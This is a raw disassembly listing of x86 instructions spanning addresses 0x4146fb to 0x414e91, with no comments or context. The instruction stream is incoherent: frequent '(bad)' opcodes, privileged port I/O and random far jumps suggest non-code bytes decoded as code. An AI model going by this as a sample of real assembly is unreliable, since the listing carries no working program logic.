  4146fb:	enter  0x14ca,0xab
  4146ff:	add    BYTE PTR [ebx-0x32],dl
  414702:	hlt    
  414703:	and    ecx,DWORD PTR [esi]
  414705:	in     al,dx
  414706:	lock and bl,bl
  414709:	mov    edi,0x19f4540c
  41470e:	mov    BYTE PTR [esi-0x55],dl
  414711:	fnstcw WORD PTR ds:0x23824239
  414717:	frstor [esi]
  414719:	fcmovnu st,st(1)
  41471b:	or     DWORD PTR [edi+0x7a2531d4],esp
  414721:	into   
  414722:	jae    0x41473d
  414724:	jecxz  0x4146ac
  414726:	(bad)  
  414727:	cs pop ebx
  414729:	push   esp
  41472a:	test   DWORD PTR fs:[eax],0x2f08cf7a
  414731:	out    dx,al
  414732:	shl    BYTE PTR [esi+0xa],1
  414735:	popa   
  414736:	addr16 sahf 
  414738:	popf   
  414739:	(bad)  
  41473a:	retf   0xd724
  41473d:	xchg   edi,eax
  41473e:	jmp    0x4146c4
  414740:	jns    0x414786
  414742:	push   ebp
  414743:	xchg   esp,eax
  414744:	or     al,0x0
  414746:	dec    ecx
  414747:	jb     0x41478d
  414749:	fidiv  WORD PTR [edx+0x31]
  41474c:	mov    BYTE PTR [esi-0x36627770],dl
  414752:	cmp    DWORD PTR [esp+ebp*2],esp
  414755:	(bad)  
  414756:	fwait
  414757:	lock jmp 0xeaa1:0x81329e9a
  41475f:	pop    esp
  414760:	jns    0x414715
  414762:	std    
  414763:	addr16 jno 0x4147e2
  414766:	xchg   ebx,eax
  414767:	ret    0x2a2a
  41476a:	aaa    
  41476b:	out    0x7b,eax
  41476d:	push   0x8fda435d
  414772:	dec    edx
  414773:	pop    edi
  414774:	ss test al,bl
  414777:	pop    edi
  414778:	out    0x22,al
  41477a:	fsub   QWORD PTR [eax+0x54]
  41477d:	call   0x2c6e7c44
  414782:	(bad)  
  414784:	or     al,0xc
  414786:	ficomp DWORD PTR [esi-0x1d292d9d]
  41478c:	ror    DWORD PTR [esi-0x29d72904],1
  414792:	clc    
  414793:	fwait
  414794:	and    eax,0x97b8dde5
  414799:	push   0xffffffa0
  41479b:	sub    DWORD PTR [ebp+0x4d],esp
  41479e:	das    
  41479f:	hlt    
  4147a0:	mov    ebp,0x347d7cb4
  4147a5:	sbb    al,0xe5
  4147a7:	cmp    al,0x90
  4147a9:	sbb    eax,0x3f9f2729
  4147ae:	loopne 0x41479d
  4147b0:	outs   dx,DWORD PTR ds:[esi]
  4147b1:	imul   edi,DWORD PTR fs:[bx],0x9
  4147b6:	or     dh,BYTE PTR [ecx]
  4147b8:	xchg   edi,eax
  4147b9:	fisub  WORD PTR [esi+0x719bdddf]
  4147bf:	sub    DWORD PTR [esi],ebx
  4147c1:	push   ds
  4147c2:	cdq    
  4147c3:	and    esi,edx
  4147c5:	xchg   DWORD PTR [edi+ebp*2+0x2c],ebp
  4147c9:	lahf   
  4147ca:	push   esi
  4147cc:	mov    ecx,0xd943bd1
  4147d1:	sub    al,0x67
  4147d3:	clc    
  4147d4:	scas   ax,WORD PTR es:[edi]
  4147d6:	or     edi,eax
  4147d8:	repnz sbb al,0x2e
  4147db:	mov    cl,0x9f
  4147dd:	add    BYTE PTR [eax-0x3928ec59],bh
  4147e3:	je     0x414862
  4147e5:	mov    dl,0xe1
  4147e7:	imul   esp,DWORD PTR [edi],0x1f4b2bc4
  4147ed:	mov    ebp,0x98d7ed44
  4147f2:	push   ebx
  4147f3:	(bad)  
  4147f4:	mov    eax,ds:0xdaa74fbb
  4147f9:	adc    DWORD PTR [esp+ebx*2],esi
  4147fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fd:	mov    eax,0x2bdd881f
  414802:	push   esi
  414803:	in     al,0x40
  414805:	nop
  414806:	aas    
  414807:	repz icebp 
  414809:	dec    esi
  41480a:	xor    edi,ebx
  41480c:	sub    ebx,esi
  41480e:	loope  0x414801
  414810:	adc    ebp,DWORD PTR [edx-0x50516781]
  414816:	les    ebx,FWORD PTR [edi+0xc]
  414819:	pop    ebp
  41481a:	jne    0x4147fb
  41481c:	mov    esp,0x2aa0fd0d
  414821:	jb     0x414800
  414823:	into   
  414824:	add    BYTE PTR [edi-0x44],bh
  414827:	xlat   BYTE PTR ds:[ebx]
  414828:	mov    ecx,0x83bd9d79
  41482d:	je     0x414836
  41482f:	nop
  414830:	mov    dl,ah
  414832:	leave  
  414833:	ins    BYTE PTR es:[edi],dx
  414834:	adc    al,0x36
  414836:	es out dx,al
  414838:	mov    eax,0x339e2023
  41483d:	push   ebx
  41483e:	push   ebx
  41483f:	jecxz  0x41488a
  414841:	lock retf 0xbbe6
  414845:	outs   dx,BYTE PTR ds:[esi]
  414846:	add    al,0x2b
  414848:	mov    ebx,0x672cd7d8
  41484d:	sbb    al,0xa9
  41484f:	push   0xffffffab
  414851:	add    eax,0xd27d01a2
  414856:	ret    0xe433
  414859:	inc    eax
  41485a:	mov    ah,0xbb
  41485c:	fcmovb st,st(6)
  41485e:	dec    ebx
  41485f:	inc    edi
  414860:	out    0xe8,al
  414862:	add    al,0x46
  414864:	jnp    0x414815
  414866:	sbb    eax,0xd300d56b
  41486b:	aaa    
  41486c:	xchg   ebp,eax
  41486d:	test   BYTE PTR [ecx+0x12c01da1],ah
  414873:	add    DWORD PTR [ebx+ebx*8-0x67],0x5d7ab50b
  41487b:	mov    eax,ds:0xb30b059a
  414880:	in     al,0xcd
  414882:	and    BYTE PTR [edx-0x78c2f7c9],ch
  414888:	imul   esp,DWORD PTR [esi+0x50],0x17
  41488c:	ret    
  41488d:	xchg   BYTE PTR [eax-0x20],dl
  414890:	lea    esp,[eax-0x1]
  414893:	clc    
  414894:	pop    ss
  414895:	mov    ah,0xd9
  414897:	int3   
  414898:	pop    ds
  414899:	and    eax,0xf9a23172
  41489e:	pop    ebp
  41489f:	or     DWORD PTR [ebx],edx
  4148a1:	fs mov dh,0xf0
  4148a4:	shl    ah,1
  4148a6:	xchg   edx,eax
  4148a7:	inc    ecx
  4148a8:	test   ebx,esi
  4148aa:	sbb    ebp,ebp
  4148ac:	inc    edx
  4148ad:	xor    edi,edi
  4148af:	sbb    DWORD PTR [ecx+ebx*8],esi
  4148b2:	outs   dx,DWORD PTR ds:[esi]
  4148b3:	ins    BYTE PTR es:[edi],dx
  4148b4:	cmp    al,0x23
  4148b6:	xchg   ebx,eax
  4148b7:	push   eax
  4148b8:	shr    bh,1
  4148ba:	and    bh,ah
  4148bc:	ror    esp,0x6a
  4148bf:	ret    
  4148c0:	ret    
  4148c1:	pop    esi
  4148c2:	test   BYTE PTR [esi+0x4f],cl
  4148c5:	xchg   ebp,eax
  4148c6:	clc    
  4148c7:	stos   BYTE PTR es:[edi],al
  4148c8:	xchg   dh,ah
  4148ca:	jb     0x40daf895
  4148d0:	push   edi
  4148d1:	push   ss
  4148d2:	mov    ch,0x6a
  4148d4:	jae    0x4148d7
  4148d6:	scas   al,BYTE PTR es:[edi]
  4148d7:	xchg   esp,eax
  4148d8:	sub    eax,0xccca2fd3
  4148dd:	in     al,dx
  4148de:	sub    al,0x9f
  4148e0:	nop
  4148e1:	xchg   esp,eax
  4148e2:	int3   
  4148e3:	in     eax,dx
  4148e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e5:	xchg   DWORD PTR [eax-0x1c],edi
  4148e8:	int3   
  4148e9:	jo     0x4148b5
  4148eb:	(bad)  
  4148ec:	fcomp  DWORD PTR [edi+0x46]
  4148ef:	xchg   ebp,eax
  4148f0:	das    
  4148f1:	dec    eax
  4148f2:	leave  
  4148f3:	mov    dh,0x15
  4148f5:	add    al,0x90
  4148f7:	dec    ebx
  4148f8:	fcomi  st,st(6)
  4148fa:	adc    ecx,DWORD PTR [ebp-0x6cbe596f]
  414900:	bound  edi,QWORD PTR [ecx-0x34]
  414903:	jmp    0x4148f5
  414905:	(bad)  
  414906:	shl    ecx,cl
  414908:	sbb    al,0xfc
  41490a:	out    dx,eax
  41490b:	and    BYTE PTR [esp+ecx*4-0xa031f94],ch
  414912:	inc    edx
  414913:	test   DWORD PTR [esi+0x6a],ecx
  414916:	dec    ecx
  414917:	dec    eax
  414918:	jecxz  0x414964
  41491a:	xlat   BYTE PTR ds:[ebx]
  41491b:	mov    edi,0x2556e9e2
  414920:	shl    BYTE PTR [esi+0x5e619429],1
  414926:	xlat   BYTE PTR ds:[ebx]
  414927:	mov    dh,0x1f
  414929:	rol    edx,1
  41492b:	bound  edx,QWORD PTR ds:[ebp+0x1f7f3291]
  414932:	add    esp,DWORD PTR [edi]
  414934:	mov    cl,0xb9
  414936:	jmp    0xaef09f72
  41493b:	mov    esp,0xa95b6a4d
  414940:	jp     0x414992
  414942:	ficomp WORD PTR ds:0x4c4f1e94
  414948:	lahf   
  414949:	jb     0x4149ae
  41494b:	pop    edi
  41494c:	cli    
  41494d:	mov    esp,0xd8bf0f95
  414952:	add    al,0x8d
  414954:	dec    ebx
  414955:	adc    cl,BYTE PTR [ecx]
  414957:	push   ecx
  414958:	cdq    
  414959:	cmp    bl,BYTE PTR [ebx]
  41495b:	push   ecx
  41495c:	jle    0x414957
  41495e:	and    ebx,DWORD PTR ds:0xa3990bb0
  414964:	sub    eax,0xf8fe11df
  414969:	out    0xed,al
  41496b:	mov    al,ds:0x6261fed7
  414970:	fadd   QWORD PTR cs:[ebp+0x8]
  414974:	and    DWORD PTR [ecx+0x79c52dd2],ebp
  41497a:	jns    0x41498a
  41497c:	sub    eax,0x13915dbd
  414981:	dec    esi
  414982:	jns    0x414987
  414984:	mov    eax,cr0
  414987:	cmovs  ebx,DWORD PTR [bx+si+0x1ba8]
  41498d:	stc    
  41498e:	dec    esi
  41498f:	popa   
  414990:	fsub   QWORD PTR [eax+0x7b]
  414993:	xor    DWORD PTR [esi-0x18],0xc1888ece
  41499a:	sub    BYTE PTR [eax-0x2db292c0],bl
  4149a0:	dec    esp
  4149a1:	jnp    0x41493b
  4149a3:	lods   al,BYTE PTR ds:[esi]
  4149a4:	sbb    cl,0xca
  4149a7:	push   0x7332f54a
  4149ac:	call   0x2078:0x8c27fdee
  4149b3:	dec    esi
  4149b4:	sbb    ch,BYTE PTR cs:[ecx-0x450451e5]
  4149bb:	imul   edi,DWORD PTR [ecx],0x3d
  4149be:	jmp    0x414a0b
  4149c0:	lods   eax,DWORD PTR ds:[esi]
  4149c1:	fs cmp al,0x87
  4149c4:	dec    ebx
  4149c5:	inc    edx
  4149c6:	arpl   WORD PTR [ebx],cx
  4149c8:	push   edx
  4149c9:	popf   
  4149ca:	imul   ecx,DWORD PTR [eax+eiz*1+0x39],0x105a8294
  4149d2:	call   DWORD PTR [ebx]
  4149d4:	inc    eax
  4149d5:	cmp    ah,BYTE PTR [esi-0x19]
  4149d8:	gs inc esp
  4149da:	ror    DWORD PTR [edi],1
  4149dc:	imul   esi,DWORD PTR ds:0x31c533bd,0xffffff82
  4149e3:	rcr    BYTE PTR [edx+0x41],1
  4149e6:	adc    BYTE PTR [ebp+0xd],bh
  4149e9:	pop    edi
  4149ea:	push   ebp
  4149eb:	fwait
  4149ec:	mov    ch,bl
  4149ee:	mov    ch,0x5f
  4149f0:	sbb    dh,bh
  4149f2:	cmp    edi,DWORD PTR [edx+eax*2+0x5b96bf9]
  4149f9:	das    
  4149fa:	fsub   QWORD PTR [esi]
  4149fc:	jns    0x414a07
  4149fe:	pop    es
  4149ff:	push   edi
  414a00:	sbb    dh,0x35
  414a03:	test   BYTE PTR [edx],cl
  414a05:	ss pop esi
  414a07:	mov    eax,ds:0xaca097bc
  414a0c:	out    0x6,eax
  414a0e:	fst    QWORD PTR [edi*1+0x7930c49b]
  414a15:	imul   ecx,esi,0x26
  414a18:	cdq    
  414a19:	xchg   esi,eax
  414a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1b:	not    eax
  414a1d:	stc    
  414a1e:	lods   al,BYTE PTR ds:[esi]
  414a1f:	dec    esp
  414a20:	aaa    
  414a21:	retf   
  414a22:	xchg   DWORD PTR [ecx+ebx*8],eax
  414a25:	mov    eax,0x3d9b793f
  414a2a:	adc    eax,0x9b488bbb
  414a2f:	sub    BYTE PTR [edi+0x439c615a],al
  414a35:	mov    ebx,0xfc8bf48
  414a3a:	mov    gs,edx
  414a3c:	and    BYTE PTR [eax],ch
  414a3e:	out    dx,al
  414a3f:	mov    eax,ds:0xa581bca0
  414a44:	sti    
  414a45:	jo     0x414a11
  414a47:	mov    al,0xd6
  414a49:	stos   DWORD PTR es:[edi],eax
  414a4a:	cmp    esi,eax
  414a4c:	out    dx,al
  414a4d:	pop    es
  414a4e:	sar    DWORD PTR [ecx],0x1f
  414a51:	mov    bh,0xbb
  414a53:	sub    BYTE PTR [esi],bl
  414a55:	sbb    ebp,DWORD PTR [edx+0x77967dcb]
  414a5b:	cmp    ch,BYTE PTR [ecx-0x6a]
  414a5e:	cli    
  414a5f:	dec    ebx
  414a60:	xor    edi,DWORD PTR [ebx+ebx*1]
  414a63:	daa    
  414a64:	adc    dl,BYTE PTR [esp+ebx*2]
  414a67:	in     eax,0xa4
  414a69:	push   es
  414a6a:	bound  ebp,QWORD PTR [eax+0x6e]
  414a6d:	loop   0x414a77
  414a6f:	out    0x3c,eax
  414a71:	(bad)  
  414a72:	xchg   edx,eax
  414a73:	jmp    0xe3e093b2
  414a78:	in     eax,dx
  414a79:	fcomp  st(2)
  414a7b:	add    al,0xf9
  414a7d:	cmp    bl,ah
  414a7f:	cmc    
  414a80:	fs dec esp
  414a82:	mov    WORD PTR [esi],?
  414a84:	repnz add al,0x41
  414a87:	loope  0x414aad
  414a89:	retf   0x1ad6
  414a8c:	jb     0x414abc
  414a8e:	push   es
  414a8f:	scas   al,BYTE PTR es:[edi]
  414a90:	mov    edi,eax
  414a92:	and    al,0x87
  414a94:	nop
  414a95:	aas    
  414a96:	jle    0x414a38
  414a98:	push   ebx
  414a99:	adc    BYTE PTR [esi+edx*8-0x41b29084],0x5c
  414aa1:	sbb    ah,BYTE PTR ds:0x5e77410c
  414aa7:	sub    cl,BYTE PTR [esi+0x43]
  414aaa:	out    dx,eax
  414aab:	jbe    0x414a85
  414aad:	mov    esi,0xc8ab249d
  414ab2:	sar    ah,cl
  414ab4:	ja     0x414b11
  414ab6:	sbb    eax,0xa3ca1658
  414abb:	push   ebx
  414abc:	pop    ss
  414abd:	in     al,dx
  414abe:	push   ebp
  414abf:	add    BYTE PTR [ebp+edx*1+0x21],bl
  414ac3:	in     al,dx
  414ac4:	iret   
  414ac5:	and    BYTE PTR [edi+0x3cb1f764],dl
  414acb:	pop    ds
  414acc:	test   BYTE PTR [edx],al
  414ace:	into   
  414acf:	mov    cl,dl
  414ad1:	mov    al,ds:0x21f18feb
  414ad6:	out    dx,al
  414ad7:	rcl    DWORD PTR ds:0xbeddfc4c,0x66
  414ade:	das    
  414adf:	xchg   edx,eax
  414ae0:	xchg   esp,eax
  414ae1:	cdq    
  414ae2:	jmp    FWORD PTR [ebp+eiz*4-0x5a]
  414ae6:	pop    ebp
  414ae7:	push   esi
  414ae8:	inc    edx
  414ae9:	int    0x35
  414aeb:	repz retf 
  414aed:	ds xor eax,0xda12de50
  414af3:	jae    0x414a7a
  414af5:	ds jmp 0x6bb2:0x6d683cd1
  414afd:	ins    BYTE PTR es:[edi],dx
  414afe:	push   ss
  414aff:	xchg   DWORD PTR [esi-0x38],esi
  414b02:	popf   
  414b03:	loopne 0x414b24
  414b05:	(bad)  
  414b06:	into   
  414b07:	scas   al,BYTE PTR es:[edi]
  414b08:	xchg   ebp,eax
  414b09:	push   eax
  414b0a:	or     edx,DWORD PTR [ecx+edx*4-0x1d]
  414b0e:	jg     0x414b43
  414b10:	enter  0xddcb,0x59
  414b14:	loop   0x414b81
  414b16:	adc    DWORD PTR [edx+0x27],edx
  414b19:	sub    cl,al
  414b1b:	das    
  414b1c:	jecxz  0x414b1e
  414b1e:	inc    eax
  414b1f:	mov    BYTE PTR [ebx-0x15],0x96
  414b23:	fistp  DWORD PTR [edi+ebp*8+0xf61c541]
  414b2a:	jl     0x414aea
  414b2c:	ret    0xa391
  414b2f:	ins    BYTE PTR es:[edi],dx
  414b30:	inc    edx
  414b31:	fucomip st,st(0)
  414b33:	shl    DWORD PTR [ebp+0xe],1
  414b36:	(bad)  
  414b37:	and    al,0x75
  414b39:	bound  esi,QWORD PTR [eax+0x66f20114]
  414b3f:	jecxz  0x414ba3
  414b41:	cmp    eax,0xbb269799
  414b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b47:	inc    ebp
  414b48:	test   BYTE PTR [bx+si+0x4c],ah
  414b4c:	jae    0x414adc
  414b4e:	cs add eax,0xd3866b3f
  414b54:	pusha  
  414b55:	fmulp  st(3),st
  414b57:	mov    al,0x95
  414b59:	pop    ss
  414b5a:	out    dx,al
  414b5b:	(bad)  
  414b5c:	mov    ds:0x2d36f566,al
  414b61:	xchg   esp,eax
  414b62:	mov    dl,0x97
  414b64:	je     0x414b69
  414b66:	fstp   QWORD PTR [ebp+0x4beb9183]
  414b6c:	lock arpl WORD PTR [esi+ebp*2+0x7b87ad00],cx
  414b74:	and    BYTE PTR [eax-0xd4bc3f5],cl
  414b7a:	inc    eax
  414b7b:	add    ch,al
  414b7d:	fs daa 
  414b7f:	pop    ebp
  414b80:	es (bad) 
  414b83:	or     dh,BYTE PTR [ebp-0x2c]
  414b86:	jb     0x414bd1
  414b88:	in     eax,0xb5
  414b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b8b:	sar    BYTE PTR [edx],0xde
  414b8e:	std    
  414b8f:	sar    BYTE PTR es:[edi+0x22c825d9],1
  414b96:	and    esp,DWORD PTR [ecx]
  414b98:	pop    ecx
  414b99:	push   0x26632f34
  414b9e:	and    eax,0xb166c62a
  414ba3:	aaa    
  414ba4:	mov    dl,0xeb
  414ba6:	xchg   edx,eax
  414ba7:	repz or al,0x57
  414baa:	enter  0xf8e5,0x51
  414bae:	loopne 0x414b78
  414bb0:	aaa    
  414bb1:	xchg   esp,eax
  414bb2:	xchg   ebx,eax
  414bb3:	add    al,0xb7
  414bb5:	inc    esi
  414bb6:	adc    eax,ecx
  414bb8:	mov    al,0x49
  414bba:	mov    bl,0xa
  414bbc:	int    0x16
  414bbe:	xchg   edi,eax
  414bbf:	add    eax,0x4d427e42
  414bc4:	or     eax,0x4c0e7cbf
  414bc9:	cpuid  
  414bcb:	mov    cs,esi
  414bcd:	fxch   st(2)
  414bcf:	jo     0x414b9b
  414bd1:	stos   BYTE PTR es:[edi],al
  414bd2:	repz jno 0x414c42
  414bd5:	mov    ebp,0x16914ee6
  414bda:	xchg   ecx,eax
  414bdb:	rcr    dh,1
  414bdd:	sar    bl,1
  414bdf:	sbb    dh,BYTE PTR [esi]
  414be1:	push   eax
  414be2:	loope  0x414c0e
  414be4:	loop   0x414b96
  414be6:	push   ds
  414be7:	scas   eax,DWORD PTR es:[edi]
  414be8:	stc    
  414be9:	retf   0x77fd
  414bec:	sub    BYTE PTR [ebp+0x39],cl
  414bef:	jb     0x414b7f
  414bf1:	jne    0x414b9d
  414bf3:	leave  
  414bf4:	xlat   BYTE PTR ds:[ebx]
  414bf5:	lds    ebp,FWORD PTR ds:0x9a8c66cb
  414bfb:	and    DWORD PTR [eax+esi*4],esi
  414bfe:	xor    BYTE PTR [ebp-0xbfe300a],dl
  414c04:	add    al,0xbf
  414c06:	cdq    
  414c07:	and    esp,DWORD PTR [esi]
  414c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c0b:	cmp    al,0xcb
  414c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c0e:	mov    bl,ch
  414c10:	in     eax,dx
  414c11:	inc    eax
  414c12:	dec    edx
  414c13:	or     DWORD PTR [esp+ebp*8+0x79],eax
  414c17:	ss pop ebx
  414c19:	jl     0x414c59
  414c1b:	dec    esp
  414c1c:	js     0x414c21
  414c1e:	(bad)  
  414c1f:	hlt    
  414c20:	xchg   ebp,eax
  414c21:	and    ebp,esi
  414c23:	arpl   WORD PTR [esi],sp
  414c25:	xchg   BYTE PTR [esi-0x71a7cf5],al
  414c2b:	popf   
  414c2c:	std    
  414c2d:	xor    BYTE PTR [esi],al
  414c2f:	mov    edx,gs
  414c31:	and    eax,DWORD PTR [esi-0x5c]
  414c34:	retf   
  414c35:	ins    BYTE PTR es:[edi],dx
  414c36:	xchg   edx,eax
  414c37:	dec    ebp
  414c38:	out    0x99,eax
  414c3a:	adc    eax,0xe5c79b7
  414c3f:	mov    edi,DWORD PTR [ecx+0x5]
  414c42:	and    al,0x7
  414c44:	in     al,dx
  414c45:	ds push ebx
  414c47:	mov    edx,0xa26f751f
  414c4c:	xor    esi,DWORD PTR [edi]
  414c4e:	cmp    eax,0xe07aca3d
  414c53:	test   eax,0x9ba48a61
  414c58:	inc    ebp
  414c59:	(bad)  
  414c5a:	jmp    0x414c7a
  414c5c:	xchg   ecx,eax
  414c5d:	mov    esp,0xf1bb529e
  414c62:	test   DWORD PTR [edx+0x712f78a4],edx
  414c68:	mov    WORD PTR [edi-0x31],cs
  414c6b:	cmp    dl,bl
  414c6d:	or     ch,ah
  414c6f:	jno    0x414c91
  414c71:	or     ebx,DWORD PTR [ecx+0x566c292a]
  414c77:	les    edi,FWORD PTR [ecx-0x17da41f6]
  414c7d:	xlat   BYTE PTR ds:[ebx]
  414c7e:	fcomp  QWORD PTR [esi+0x5c]
  414c81:	xor    BYTE PTR [eax-0x55],0x54
  414c85:	sub    DWORD PTR [esi+eiz*2],ebx
  414c88:	xchg   ecx,eax
  414c89:	xor    eax,0x8cda6c13
  414c8e:	les    ebx,FWORD PTR [edx+ebx*1+0x1d]
  414c92:	and    BYTE PTR [ebx-0xd916c3d],dl
  414c98:	shr    DWORD PTR [edi],0xbf
  414c9b:	mov    DWORD PTR [edi],ecx
  414c9d:	dec    ebx
  414c9e:	js     0x414c31
  414ca0:	add    edx,DWORD PTR [edi+0x15]
  414ca3:	sbb    BYTE PTR [ebx-0x33bbc5b7],ch
  414ca9:	data16 mov ?,WORD PTR [edi+0x2c528a7e]
  414cb0:	mov    bh,0x53
  414cb2:	pushf  
  414cb3:	dec    eax
  414cb4:	xchg   esi,eax
  414cb5:	jecxz  0x414cbd
  414cb7:	push   es
  414cb8:	adc    BYTE PTR [ebx],0xf2
  414cbb:	dec    edx
  414cbc:	add    BYTE PTR [edx+0x17858d9a],ch
  414cc2:	int    0xa8
  414cc4:	fsub   QWORD PTR [eax]
  414cc6:	nop
  414cc7:	mul    BYTE PTR es:[ebx+0x24]
  414ccb:	lods   eax,DWORD PTR ds:[esi]
  414ccc:	xor    BYTE PTR [edi+ebx*1],ch
  414ccf:	fs das 
  414cd1:	jle    0x414cb1
  414cd3:	dec    ebp
  414cd4:	aad    0x58
  414cd6:	push   ecx
  414cd7:	sti    
  414cd8:	add    al,0x21
  414cda:	(bad)  [ebx+0x6d6f6c1d]
  414ce0:	add    BYTE PTR [ecx-0x24],ah
  414ce3:	repnz in al,0xf5
  414ce6:	sbb    DWORD PTR [esp+eax*8],esi
  414ce9:	lods   al,BYTE PTR ds:[esi]
  414cea:	arpl   sp,bx
  414cec:	xor    DWORD PTR [ecx+0x2154009],eax
  414cf2:	lods   al,BYTE PTR ds:[esi]
  414cf3:	mov    eax,DWORD PTR [ecx]
  414cf5:	push   edi
  414cf6:	scas   eax,DWORD PTR es:[edi]
  414cf7:	dec    esi
  414cf8:	aam    0x71
  414cfa:	mov    al,0xd7
  414cfc:	outs   dx,BYTE PTR ds:[esi]
  414cfd:	add    eax,DWORD PTR [edx-0x60]
  414d00:	dec    ecx
  414d01:	pop    edi
  414d02:	pop    edx
  414d03:	xor    al,0x13
  414d05:	mov    esi,0x31a42bd1
  414d0a:	mov    edi,0x6225647f
  414d0f:	xor    BYTE PTR [ecx-0x60df8d56],ah
  414d15:	in     eax,dx
  414d16:	cmp    bh,BYTE PTR [esi+0x29]
  414d19:	inc    esi
  414d1a:	mov    edi,0x3d25d5a7
  414d1f:	add    eax,0x23d9b96b
  414d24:	leave  
  414d25:	dec    ebx
  414d26:	dec    esp
  414d27:	test   BYTE PTR es:[esi-0x2f],al
  414d2b:	dec    edx
  414d2c:	sub    DWORD PTR [eax-0x4335cefc],eax
  414d32:	or     ebx,DWORD PTR [eax-0x5e]
  414d35:	mov    dl,0x60
  414d37:	push   ebp
  414d38:	sub    DWORD PTR [esi+ebx*8-0x1383b929],ebp
  414d3f:	in     eax,0x83
  414d41:	in     eax,dx
  414d42:	mov    WORD PTR [ebp+0x6b8c0b68],cs
  414d48:	jl     0x414d90
  414d4a:	or     eax,0xd261b02f
  414d4f:	inc    ecx
  414d50:	ret    0x4be9
  414d53:	push   ds
  414d54:	or     DWORD PTR [eax],ebx
  414d56:	or     BYTE PTR ds:0x36203d44,0x1e
  414d5d:	mov    al,ds:0xb4ca5ff0
  414d62:	ins    BYTE PTR es:[edi],dx
  414d63:	inc    ebp
  414d64:	inc    ecx
  414d65:	dec    ebp
  414d66:	dec    ecx
  414d67:	outs   dx,BYTE PTR ds:[esi]
  414d68:	dec    esp
  414d69:	push   edi
  414d6a:	test   DWORD PTR [edx],0x7eb62776
  414d70:	mov    edx,0x53ae0f51
  414d75:	mov    ecx,0xf4f77bb8
  414d7a:	push   0x19
  414d7c:	or     dl,BYTE PTR [edi]
  414d7e:	add    al,0xd5
  414d80:	fsub   st,st(0)
  414d82:	push   esi
  414d83:	adc    eax,0x4169154f
  414d88:	and    eax,0xecd75714
  414d8d:	push   es
  414d8e:	and    ebx,DWORD PTR [ebp-0x2f5eb50d]
  414d94:	ins    BYTE PTR es:[edi],dx
  414d95:	(bad)  
  414d96:	mov    edi,gs
  414d98:	test   al,0xde
  414d9a:	hlt    
  414d9b:	out    0xe9,eax
  414d9d:	outs   dx,DWORD PTR ds:[esi]
  414d9e:	or     esp,DWORD PTR [ecx+0x6d0b694e]
  414da4:	sbb    eax,0x1a63cfb2
  414da9:	fwait
  414daa:	pop    ecx
  414dab:	jl     0x414d68
  414dad:	mov    edx,?
  414daf:	jno    0x414d42
  414db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414db2:	shl    DWORD PTR [ebx],cl
  414db4:	inc    ecx
  414db5:	pop    eax
  414db6:	mov    al,ds:0xe4606720
  414dbb:	stos   DWORD PTR es:[edi],eax
  414dbc:	mov    ah,0x56
  414dbe:	or     al,0xc8
  414dc0:	or     al,0x58
  414dc2:	xor    al,0x4e
  414dc4:	sub    al,0x1d
  414dc6:	xor    al,0x9e
  414dc8:	pop    ebx
  414dc9:	jno    0x414d77
  414dcb:	les    eax,FWORD PTR [ebx+0xedaba60]
  414dd1:	cld    
  414dd2:	lods   al,BYTE PTR ds:[esi]
  414dd3:	push   ds
  414dd4:	mov    BYTE PTR [esi-0x7ca7be47],ah
  414dda:	jecxz  0x414d97
  414ddc:	mov    bh,0x94
  414dde:	xor    eax,0xb81e3b04
  414de3:	int    0xa5
  414de5:	(bad)  
  414de6:	mov    al,ds:0x492816ac
  414deb:	jae    0x414dec
  414ded:	jae    0x414e52
  414def:	mov    ah,BYTE PTR [ebp+0x2d]
  414df2:	mov    BYTE PTR [edi-0x31946862],bl
  414df8:	(bad)  
  414df9:	out    dx,al
  414dfa:	lds    esi,FWORD PTR ds:0x70239d47
  414e00:	inc    edx
  414e01:	jb     0x414d9c
  414e03:	mov    dh,0x48
  414e05:	mov    dl,0xbe
  414e07:	push   ss
  414e08:	adc    BYTE PTR [esi-0x21],dh
  414e0b:	jle    0x414daf
  414e0d:	(bad)  
  414e0e:	jp     0x414dc4
  414e10:	jbe    0x414da7
  414e12:	jl     0x414e29
  414e14:	frstor ds:0x92dcf7d5
  414e1a:	cdq    
  414e1b:	in     al,dx
  414e1c:	ficomp DWORD PTR [ebp-0x5f329ae2]
  414e22:	push   ds
  414e23:	jg     0x414e8d
  414e25:	adc    eax,0x87f02f80
  414e2a:	leave  
  414e2b:	pop    ebx
  414e2c:	aas    
  414e2d:	aaa    
  414e2e:	ss xchg esp,eax
  414e30:	leave  
  414e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e32:	pushaw 
  414e34:	popf   
  414e35:	call   DWORD PTR [esi-0x8]
  414e38:	mov    ds:0x23d4e9f3,eax
  414e3d:	(bad)  
  414e3e:	pop    ds
  414e3f:	inc    ebp
  414e40:	retf   
  414e41:	cwde   
  414e42:	lods   eax,DWORD PTR ds:[esi]
  414e43:	jmp    0xde9944d7
  414e48:	sbb    eax,0xf91b5b34
  414e4d:	adc    BYTE PTR [eax-0x5c],cl
  414e50:	inc    ebp
  414e51:	push   eax
  414e52:	push   es
  414e53:	mov    edx,0x99aa52bd
  414e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e59:	inc    esi
  414e5a:	mov    cl,0xb3
  414e5c:	repz cmp eax,0x535d5210
  414e62:	in     eax,dx
  414e63:	mov    BYTE PTR [esi],cl
  414e65:	push   edx
  414e66:	sub    al,0xe1
  414e68:	mov    ds:0xe9321511,al
  414e6d:	int3   
  414e6e:	jle    0x414e42
  414e70:	ds sbb cl,bl
  414e73:	adc    ecx,DWORD PTR ds:0x2d8c6f6c
  414e79:	retf   0x6282
  414e7c:	pop    es
  414e7d:	mov    ch,0x4f
  414e7f:	push   ebx
  414e80:	mov    esp,0x5257cbb6
  414e85:	outs   dx,BYTE PTR ds:[esi]
  414e86:	loopne 0x414ebd
  414e88:	outs   dx,BYTE PTR ds:[esi]
  414e89:	mov    ch,0xe4
  414e8b:	outs   dx,BYTE PTR ds:[esi]
  414e8c:	mov    esi,0x292fc91f
  414e91:	ret    
